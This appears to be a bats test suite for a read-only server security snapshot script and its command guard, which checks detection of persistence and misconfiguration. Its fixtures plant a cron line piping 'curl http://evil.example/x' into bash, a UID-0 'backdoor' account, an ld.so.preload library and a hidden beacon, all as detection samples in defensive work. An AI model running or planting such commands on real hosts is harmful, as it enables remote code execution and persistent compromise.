#!/usr/bin/env bats

SCRIPT="${BATS_TEST_DIRNAME}/../scripts/collect/server_snapshot.sh"
GUARD="${BATS_TEST_DIRNAME}/../hooks/guard.sh"
export WR_POLICY_DIR="${BATS_TEST_DIRNAME}/../policy"

# Build a temp PATH dir with stub binaries; each stub echoes a canned line.
make_stubs() {
  STUB="$(mktemp -d)"
  local t
  for t in "$@"; do
    cat > "$STUB/$t" <<EOF
#!/usr/bin/env bash
echo "STUB-$t-output \$*"
EOF
    chmod +x "$STUB/$t"
  done
}

teardown() { [ -n "${STUB:-}" ] && rm -rf "$STUB" || true; }

# Returns "deny" or "allow" for a command run through the guard.
guard_decision() {
  local out
  out="$(jq -n --arg c "$1" '{tool_name:"Bash",tool_input:{command:$c}}' | bash "$GUARD")"
  if echo "$out" | grep -q '"deny"'; then echo deny; else echo allow; fi
}

@test "snapshot emits all section markers when tools are present" {
  make_stubs sshd ss ufw iptables nft hostname uname sysctl apt docker systemctl
  run env PATH="$STUB:$PATH" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  local s
  for s in meta ssh_config listening firewall users_auth sudoers authorized_keys scheduled persistence_signals patching packages sysctl_hardening docker end; do
    echo "$output" | grep -q "WR-SECTION: $s" || { echo "missing section: $s"; echo "$output"; return 1; }
  done
}

# ---- persistence-pack sections (fixture tree via WR_ROOT seam) ----

make_fake_root() {
  FAKE="$(mktemp -d)"
  mkdir -p "$FAKE/etc/sudoers.d" "$FAKE/etc/cron.d" "$FAKE/home/dev/.ssh" \
           "$FAKE/var/run" "$FAKE/var/spool/cron/crontabs" "$FAKE/proc/123" "$FAKE/tmp"
  cat > "$FAKE/etc/passwd" <<'EOF'
root:x:0:0:root:/root:/bin/bash
backdoor:x:0:0::/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33::/var/www:/usr/sbin/nologin
dev:x:1000:1000::/home/dev:/bin/bash
EOF
  cat > "$FAKE/etc/shadow" <<'EOF'
root:$6$saltsalt$FAKEHASHFAKEHASH:19000:0:99999:7:::
eve::19000:0:99999:7:::
dev:$6$other$HASH2:19000:0:99999:7:::
EOF
  cat > "$FAKE/etc/group" <<'EOF'
sudo:x:27:dev
docker:x:998:dev,www-data
EOF
  cat > "$FAKE/etc/sudoers" <<'EOF'
# comment to be stripped
root ALL=(ALL:ALL) ALL
EOF
  printf 'dev ALL=(ALL) NOPASSWD: ALL\n' > "$FAKE/etc/sudoers.d/90-dev"
  printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKeyMaterialForTest dev@laptop\n' \
    > "$FAKE/home/dev/.ssh/authorized_keys"
  printf '* * * * * root curl http://evil.example/x | bash\n' > "$FAKE/etc/crontab"
  printf '*/5 * * * * dev /tmp/.hidden/beacon.sh\n' > "$FAKE/var/spool/cron/crontabs/dev"
  printf '/lib/evil.so\n' > "$FAKE/etc/ld.so.preload"
  ln -s "/usr/bin/miner (deleted)" "$FAKE/proc/123/exe"
  printf 'linux-image-6.8.0-111\n' > "$FAKE/var/run/reboot-required"
  printf '#!/bin/sh\n/opt/startup-thing\n' > "$FAKE/etc/rc.local"
}

@test "users_auth: flags UID-0 duplicates and empty shadow passwords, never prints hashes" {
  make_fake_root
  run env WR_ROOT="$FAKE" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  echo "$output" | grep -q 'uid0: root'
  echo "$output" | grep -q 'uid0: backdoor'
  echo "$output" | grep -q 'empty_password: eve'
  echo "$output" | grep -q 'shell_user: dev'
  ! echo "$output" | grep -q 'shell_user: www-data'
  ! echo "$output" | grep -qF 'FAKEHASH'   # shadow hashes must never appear
  rm -rf "$FAKE"
}

@test "sudoers: emits NOPASSWD rules (comments stripped) and sudo/docker group members" {
  make_fake_root
  run env WR_ROOT="$FAKE" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  echo "$output" | grep -q 'NOPASSWD: ALL'
  ! echo "$output" | grep -q 'comment to be stripped'
  echo "$output" | grep -q 'group: sudo members=dev'
  echo "$output" | grep -q 'group: docker members=dev,www-data'
  rm -rf "$FAKE"
}

@test "authorized_keys: inventories keys per user with count and comment" {
  make_fake_root
  run env WR_ROOT="$FAKE" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  echo "$output" | grep -Eq 'authorized_keys: dev /home/dev/.ssh/authorized_keys keys=1 mtime='
  echo "$output" | grep -q 'dev@laptop'
  rm -rf "$FAKE"
}

@test "authorized_keys: NEVER prints the key blob for a comment-less key" {
  FAKE="$(mktemp -d)"; mkdir -p "$FAKE/etc" "$FAKE/home/svc/.ssh"
  printf 'svc:x:1002:1002::/home/svc:/bin/bash\n' > "$FAKE/etc/passwd"
  # A key with NO trailing comment — the last field is the base64 blob.
  printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAISECRETBLOBMUSTNOTLEAK\n' \
    > "$FAKE/home/svc/.ssh/authorized_keys"
  run env WR_ROOT="$FAKE" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  echo "$output" | grep -q 'authorized_keys: svc'      # inventoried
  echo "$output" | grep -q 'key: ssh-ed25519 (no comment)'
  ! echo "$output" | grep -qF 'SECRETBLOBMUSTNOTLEAK'  # blob must never appear
  rm -rf "$FAKE"
}

@test "authorized_keys: a home shared by two accounts is inventoried once" {
  make_fake_root   # root + backdoor both have home /root
  mkdir -p "$FAKE/root/.ssh"
  printf 'ssh-ed25519 AAAAROOTKEY admin@ops\n' > "$FAKE/root/.ssh/authorized_keys"
  run env WR_ROOT="$FAKE" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | grep -c '/root/.ssh/authorized_keys keys=')" -eq 1 ]
  rm -rf "$FAKE"
}

@test "scheduled: surfaces system crontab and per-user spool entries" {
  make_fake_root
  run env WR_ROOT="$FAKE" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  echo "$output" | grep -qF 'curl http://evil.example/x | bash'
  echo "$output" | grep -q 'user crontab: dev'
  echo "$output" | grep -qF '/tmp/.hidden/beacon.sh'
  rm -rf "$FAKE"
}

@test "scheduled: a cron command containing an inline '#' is NOT truncated" {
  FAKE="$(mktemp -d)"; mkdir -p "$FAKE/etc"
  printf 'root:x:0:0:root:/root:/bin/bash\n' > "$FAKE/etc/passwd"
  printf "0 * * * * root curl 'https://host/path#frag' | sh\n" > "$FAKE/etc/crontab"
  run env WR_ROOT="$FAKE" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  echo "$output" | grep -qF "curl 'https://host/path#frag' | sh"
  rm -rf "$FAKE"
}

@test "persistence_signals: ld.so.preload, deleted-binary process, rc.local" {
  make_fake_root
  run env WR_ROOT="$FAKE" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  echo "$output" | grep -q 'ld_so_preload: /lib/evil.so'
  echo "$output" | grep -qF '(deleted)'
  echo "$output" | grep -qF '/opt/startup-thing'
  rm -rf "$FAKE"
}

@test "persistence_signals: quiet notes when nothing suspicious exists" {
  FAKE="$(mktemp -d)"; mkdir -p "$FAKE/etc"
  printf 'root:x:0:0:root:/root:/bin/bash\n' > "$FAKE/etc/passwd"
  run env WR_ROOT="$FAKE" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  echo "$output" | grep -q 'ld.so.preload: absent/empty'
  echo "$output" | grep -q 'no deleted-binary processes'
  rm -rf "$FAKE"
}

@test "persistence_signals: a kernel thread (empty exe + empty cmdline) does NOT trip 'scan incomplete'" {
  # Live-host regression: kernel threads ([kworker] et al.) have an empty /proc/PID/exe even
  # under root — that is expected, not a permission blind spot. A regular empty file stands in
  # for the kthread exe (readlink yields ""), with an empty cmdline as the kthread signature.
  FAKE="$(mktemp -d)"; mkdir -p "$FAKE/etc" "$FAKE/proc/2"
  printf 'root:x:0:0:root:/root:/bin/bash\n' > "$FAKE/etc/passwd"
  : > "$FAKE/proc/2/exe"
  : > "$FAKE/proc/2/cmdline"
  run env WR_ROOT="$FAKE" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  echo "$output" | grep -q 'no deleted-binary processes'
  ! echo "$output" | grep -q 'scan incomplete'
  rm -rf "$FAKE"
}

@test "persistence_signals: an opaque userspace exe (empty link, real cmdline) IS a blind spot" {
  # A process with a non-empty cmdline whose exe link we cannot resolve is a genuine blind spot
  # (e.g. another user's process under a non-root audit) — that must still say "scan incomplete".
  FAKE="$(mktemp -d)"; mkdir -p "$FAKE/etc" "$FAKE/proc/999"
  printf 'root:x:0:0:root:/root:/bin/bash\n' > "$FAKE/etc/passwd"
  : > "$FAKE/proc/999/exe"
  printf '/usr/sbin/haproxy\0-f\0/etc/haproxy.cfg\0' > "$FAKE/proc/999/cmdline"
  run env WR_ROOT="$FAKE" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  echo "$output" | grep -q 'scan incomplete'
  rm -rf "$FAKE"
}

@test "patching: reports reboot-required from the fixture tree" {
  make_fake_root
  run env WR_ROOT="$FAKE" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  echo "$output" | grep -q 'reboot_required: yes'
  rm -rf "$FAKE"
}

@test "patching: classifies a security update from the apt pocket (case-insensitive, scoped)" {
  STUB="$(mktemp -d)"
  cat > "$STUB/apt" <<'EOF2'
#!/usr/bin/env bash
if [ "$1 $2" = "list --upgradable" ]; then
  echo "Listing..."
  echo "libssl3/jammy-security 3.0.13-0ubuntu3.1 amd64 [upgradable from: 3.0.13-0ubuntu3]"
  echo "vim/jammy-updates 2:9.0.1378 amd64 [upgradable from: 2:9.0.1000]"
fi
EOF2
  chmod +x "$STUB/apt"
  run env PATH="$STUB:$PATH" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  local sec
  sec="$(echo "$output" | awk '/WR-SECTION: patching/{f=1;next} /WR-SECTION:/{f=0} f')"
  echo "$sec" | grep -q 'upgradable_total: 2'
  echo "$sec" | grep -q 'security_updates:'
  echo "$sec" | grep -q 'libssl3'
  ! echo "$sec" | grep -q 'vim/jammy-updates'   # a plain -updates package must not be miscounted as security
  rm -rf "$STUB"
}

@test "patching: falls back to 'apt-get -s' to classify security updates the pocket list hides" {
  # The prod-run gap: 192 upgradable, 0 classified — Ubuntu also ships security fixes through the
  # -updates pocket, so 'apt list --upgradable' shows -updates and a pocket grep finds nothing.
  # 'apt-get -s upgrade' exposes the real archive origin (jammy-security) and rescues the count.
  STUB="$(mktemp -d)"
  cat > "$STUB/apt" <<'EOF2'
#!/usr/bin/env bash
if [ "$1 $2" = "list --upgradable" ]; then
  echo "Listing..."
  echo "libc6/jammy-updates 2.35-0ubuntu3.8 amd64 [upgradable from: 2.35-0ubuntu3.4]"
fi
EOF2
  cat > "$STUB/apt-get" <<'EOF2'
#!/usr/bin/env bash
echo "Reading package lists..."
echo "Inst libc6 [2.35-0ubuntu3.4] (2.35-0ubuntu3.8 Ubuntu:22.04/jammy-security, Ubuntu:22.04/jammy-updates [amd64])"
echo "Conf libc6 (2.35-0ubuntu3.8 Ubuntu:22.04/jammy-security [amd64])"
EOF2
  chmod +x "$STUB/apt" "$STUB/apt-get"
  run env PATH="$STUB:$PATH" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  local sec
  sec="$(echo "$output" | awk '/WR-SECTION: patching/{f=1;next} /WR-SECTION:/{f=0} f')"
  echo "$sec" | grep -q 'security_updates:'
  echo "$sec" | grep -q 'libc6'
  rm -rf "$STUB"
}

@test "new data-collection commands are read-only (pass the guard)" {
  local cmd
  for cmd in \
    "cat /etc/crontab" \
    "cat /etc/sudoers" \
    "ls -l /proc/123/exe" \
    "stat -c %y /home/dev/.ssh/authorized_keys" \
    "sysctl -n kernel.randomize_va_space" \
    "systemctl list-timers --all --no-pager" \
    "apt list --upgradable" \
    "find /usr/bin -xdev -type f -perm -4000" ; do
    [ "$(guard_decision "$cmd")" = "allow" ] || { echo "guard wrongly DENIED read cmd: $cmd"; return 1; }
  done
}

@test "firewall section degrades to a note when no firewall tool is present" {
  make_stubs sshd ss hostname uname   # no ufw / iptables / nft stubbed
  run env PATH="$STUB:$PATH" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  echo "$output" | grep -q "WR-SECTION: firewall"
  echo "$output" | grep -Eq "no firewall tool present|WR-TOOL:"
}

@test "every data-collection command is read-only (passes the guard)" {
  local cmd
  for cmd in \
    "hostname" \
    "uname -a" \
    "date -u '+collected_utc: %Y-%m-%dT%H:%M:%SZ'" \
    "cat /etc/os-release" \
    "sshd -T" \
    "cat /etc/ssh/sshd_config" \
    "ss -tulpnH" \
    "ss -tulpn" \
    "netstat -tulpn" \
    "ufw status verbose" \
    "iptables -S" \
    "iptables -L -n -v" \
    "nft list ruleset" ; do
    [ "$(guard_decision "$cmd")" = "allow" ] || { echo "guard wrongly DENIED read cmd: $cmd"; return 1; }
  done
}

@test "read-only guard check has teeth (a mutating command denies)" {
  [ "$(guard_decision "rm -rf /tmp/x")" = "deny" ]
}

@test "the collector's ssh invocation passes the guard" {
  [ "$(guard_decision "ssh user@host 'bash -s' < scripts/collect/server_snapshot.sh")" = "allow" ]
}

@test "run_ro escalates to sudo -n for privileged reads, and only with read commands" {
  STUB="$(mktemp -d)"; SUDOLOG="$STUB/sudo.log"
  cat > "$STUB/sudo" <<EOF2
#!/usr/bin/env bash
if [ "\$1" = "-n" ]; then shift; fi
if [ "\$1" = "true" ]; then exit 0; fi
echo "\$*" >> "$SUDOLOG"
echo "PRIV(\$1)"; exit 0
EOF2
  printf '#!/usr/bin/env bash\nexit 1\n' > "$STUB/sshd"   # sshd present so 'have sshd' is true; the sudo stub handles escalation
  printf '#!/usr/bin/env bash\nexit 1\n' > "$STUB/ufw"
  chmod +x "$STUB"/*
  run env PATH="$STUB:$PATH" WR_SSHD_CONFIG_D=/nonexistent bash "$SCRIPT"
  [ "$status" -eq 0 ]
  # sudo was used for the privileged reads...
  grep -q 'sshd -T' "$SUDOLOG"
  # ...and ONLY for read commands (no mutating verb ever passed to sudo)
  ! grep -Eq '(^|[[:space:]])(rm|mv|systemctl[[:space:]]+(stop|start|restart)|ufw[[:space:]]+(enable|allow|deny)|iptables[[:space:]]+-[AD]|nft[[:space:]]+add|tee|dd|chmod|chown)' "$SUDOLOG"
  rm -rf "$STUB"
}

@test "sshd_config drop-in files are included on the file fallback" {
  STUB="$(mktemp -d)"; DROP="$(mktemp -d)"
  printf '#!/usr/bin/env bash\nexit 1\n' > "$STUB/sshd"; chmod +x "$STUB/sshd"   # force fallback
  cat > "$STUB/sudo" <<'EOF2'
#!/usr/bin/env bash
if [ "$1" = "-n" ]; then shift; fi
if [ "$1" = "true" ]; then exit 0; fi
exit 1
EOF2
  chmod +x "$STUB/sudo"
  printf 'PasswordAuthentication no\n' > "$DROP/50-cloud-init.conf"
  run env PATH="$STUB:$PATH" WR_SSHD_CONFIG_D="$DROP" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  echo "$output" | grep -q -- '---- drop-in:'
  echo "$output" | grep -q 'PasswordAuthentication no'
  rm -rf "$STUB" "$DROP"
}

# ---- packages inventory (CVE-scan feed) ----

@test "packages: dpkg inventory passes through with source-package columns" {
  STUB="$(mktemp -d)"
  cat > "$STUB/dpkg-query" <<'EOF2'
#!/usr/bin/env bash
printf 'openssl\t3.0.13-0ubuntu3\topenssl\t3.0.13-0ubuntu3\n'
printf 'libssl3t64\t3.0.13-0ubuntu3\topenssl\t3.0.13-0ubuntu3\n'
EOF2
  chmod +x "$STUB/dpkg-query"
  run env PATH="$STUB:$PATH" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  echo "$output" | grep -q 'WR-SECTION: packages'
  echo "$output" | grep -q 'pkg_manager: dpkg'
  echo "$output" | grep -q "libssl3t64	3.0.13-0ubuntu3	openssl	3.0.13-0ubuntu3"
}

@test "packages: rpm fallback is used when dpkg-query is absent" {
  command -v dpkg-query >/dev/null 2>&1 && skip "dpkg-query present on this host"
  STUB="$(mktemp -d)"
  cat > "$STUB/rpm" <<'EOF2'
#!/usr/bin/env bash
printf 'openssl-libs\t1:3.2.2-6.el9\topenssl-libs\t1:3.2.2-6.el9\n'
EOF2
  chmod +x "$STUB/rpm"
  run env PATH="$STUB:$PATH" bash "$SCRIPT"
  [ "$status" -eq 0 ]
  echo "$output" | grep -q 'pkg_manager: rpm'
  echo "$output" | grep -q "openssl-libs	1:3.2.2-6.el9"
}

@test "packages: neither dpkg nor rpm present yields a note, not a crash" {
  command -v dpkg-query >/dev/null 2>&1 && skip "dpkg-query present on this host"
  command -v rpm >/dev/null 2>&1 && skip "rpm present on this host"
  run bash "$SCRIPT"
  [ "$status" -eq 0 ]
  echo "$output" | grep -q 'WR-SECTION: packages'
  echo "$output" | grep -qi 'package inventory skipped'
}

@test "packages: the inventory commands are read-only (pass the guard)" {
  [ "$(guard_decision "dpkg-query -W -f 'x'")" = "allow" ]
  [ "$(guard_decision "rpm -qa --qf 'x'")" = "allow" ]
}
